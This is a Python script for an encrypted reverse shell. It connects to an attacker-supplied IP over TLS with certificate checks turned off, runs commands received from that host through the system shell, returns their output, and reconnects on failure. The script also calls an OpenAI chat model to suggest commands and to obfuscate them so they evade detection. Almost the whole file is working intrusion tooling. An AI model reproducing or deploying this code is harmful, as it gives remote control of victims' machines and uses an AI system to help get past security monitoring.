#!/usr/bin/env python3
import socket
import json
import time
import subprocess
import os
import ssl
import argparse
import openai
from threading import Thread
from cryptography.fernet import Fernet  # Added local encryption

# --- Configuration ---
openai.api_key = os.getenv('OPENAI_KEY')  # Securely load API key
parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="Attacker's IP", required=True)
parser.add_argument("--port", type=int, default=5555)
parser.add_argument("--key", help="Encryption key", required=True)
args = parser.parse_args()

# --- AI Assistant Core ---
class AIAssistant:
    @staticmethod
    def suggest_command(context):
        response = openai.ChatCompletion.create(
            model="gpt-3.5-turbo",
            messages=[{
                "role": "system",
                "content": "You're a pentesting assistant. Suggest the most relevant UNIX command."
            },{
                "role": "user",
                "content": context
            }],
            temperature=0.3
        )
        return response.choices[0].message.content

    @staticmethod
    def obfuscate(command):
        response = openai.ChatCompletion.create(
            model="gpt-3.5-turbo",
            messages=[{
                "role": "system",
                "content": "Obfuscate this command to avoid detection while maintaining functionality:"
            },{
                "role": "user",
                "content": command
            }],
            temperature=0.7
        )
        return response.choices[0].message.content

# --- Secure Communication ---
class SecureChannel:
    def __init__(self, ip, port, key):
        self.cipher = Fernet(key.encode())
        self.sock = self._create_secure_connection(ip, port)

    def _create_secure_connection(self, ip, port):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        secure_sock = context.wrap_socket(sock, server_hostname=ip)
        secure_sock.connect((ip, port))
        return secure_sock

    def send(self, data):
        encrypted = self.cipher.encrypt(json.dumps(data).encode())
        self.sock.send(encrypted)

    def recv(self):
        data = b''
        while True:
            try:
                chunk = self.sock.recv(1024)
                if not chunk: break
                data += chunk
                return json.loads(self.cipher.decrypt(data).decode())
            except (ValueError, json.JSONDecodeError):
                continue

# --- Main Shell Functionality ---
def main():
    channel = SecureChannel(args.ip, args.port, args.key)
    
    while True:
        try:
            command = channel.recv()
            
            if command == 'suggest':
                suggestion = AIAssistant.suggest_command(os.getcwd())
                channel.send(suggestion)
            
            elif command.startswith('ai '):
                obfuscated = AIAssistant.obfuscate(command[3:])
                execute_command(channel, obfuscated)
            
            else:
                execute_command(channel, command)
                
        except Exception as e:
            time.sleep(20)
            main()  # Reconnect on failure

def execute_command(channel, command):
    if command == 'quit':
        channel.sock.close()
        os._exit(0)
    
    elif command.startswith('cd '):
        os.chdir(command[3:])
        channel.send(f"Changed to {os.getcwd()}")
    
    else:
        proc = subprocess.Popen(command, shell=True,
                              stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE,
                              stdin=subprocess.PIPE)
        result = proc.stdout.read() + proc.stderr.read()
        channel.send(result.decode())

if __name__ == "__main__":
    main()
